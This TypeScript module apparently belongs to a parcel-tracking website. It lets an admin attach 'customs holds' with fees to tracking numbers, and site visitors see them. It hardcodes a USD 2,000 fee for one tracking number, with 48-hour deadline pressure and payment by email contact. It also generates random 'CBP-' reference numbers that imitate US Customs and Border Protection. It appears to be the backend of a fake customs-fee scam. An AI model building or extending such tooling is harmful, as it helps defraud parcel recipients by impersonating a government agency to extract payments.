/**
 * Customs Hold / Clearance Fee utility.
 *
 * Stores customs‐hold data in the Supabase `customs_holds` table so it works
 * across all devices. Admin sets the hold + fee; any visitor can read it.
 */

import { supabase } from "@/integrations/supabase/client";

export interface CustomsHold {
  enabled: boolean;
  feeAmount: number;
  feeCurrency: string;
  reason: string;
  holdDate: string;
  referenceNumber: string;
  paymentInstructions: string;
  deadlineDate?: string;
}

const HARDCODED_HOLDS: Record<string, CustomsHold> = {
  "3614262843782321": {
    enabled: true,
    feeAmount: 2000,
    feeCurrency: "USD",
    reason: "Package held at customs for inspection and regulatory compliance verification.",
    holdDate: "2026-05-25T06:00:00Z",
    deadlineDate: "2026-06-09T06:00:00Z",
    referenceNumber: "CBP-A7X9K2M4P8",
    paymentInstructions: "Payment must be completed within 48 hours to avoid return-to-sender processing. Contact support@parceltrace.com for payment instructions.",
  },
};

export async function fetchCustomsHold(trackingNumber: string): Promise<CustomsHold | null> {
  const hardcoded = HARDCODED_HOLDS[trackingNumber.trim()];
  if (hardcoded) return hardcoded;

  const { data, error } = await supabase
    .from("customs_holds")
    .select("*")
    .eq("tracking_number", trackingNumber.trim())
    .eq("enabled", true)
    .maybeSingle();
  if (error) {
    // Silently swallow schema errors — fallback to no hold
    console.warn("[customs] Supabase error:", error.message);
    return null;
  }
  if (!data) return null;
  return {
    enabled: data.enabled,
    feeAmount: Number(data.fee_amount),
    feeCurrency: data.fee_currency,
    reason: data.reason,
    holdDate: data.hold_date,
    deadlineDate: (data as any).deadline_date,
    referenceNumber: data.reference_number,
    paymentInstructions: data.payment_instructions,
  };
}

export async function upsertCustomsHold(trackingNumber: string, hold: CustomsHold) {
  const { error } = await supabase
    .from("customs_holds")
    .upsert(
      {
        tracking_number: trackingNumber,
        enabled: hold.enabled,
        fee_amount: hold.feeAmount,
        fee_currency: hold.feeCurrency,
        reason: hold.reason,
        hold_date: hold.holdDate,
        reference_number: hold.referenceNumber,
        payment_instructions: hold.paymentInstructions,
      },
      { onConflict: "tracking_number" }
    );
  if (error) throw error;
}

export async function deleteCustomsHold(trackingNumber: string) {
  const { error } = await supabase
    .from("customs_holds")
    .delete()
    .eq("tracking_number", trackingNumber);
  if (error) throw error;
}

export function generateReferenceNumber(): string {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let ref = "CBP-";
  for (let i = 0; i < 10; i++) ref += chars[Math.floor(Math.random() * chars.length)];
  return ref;
}
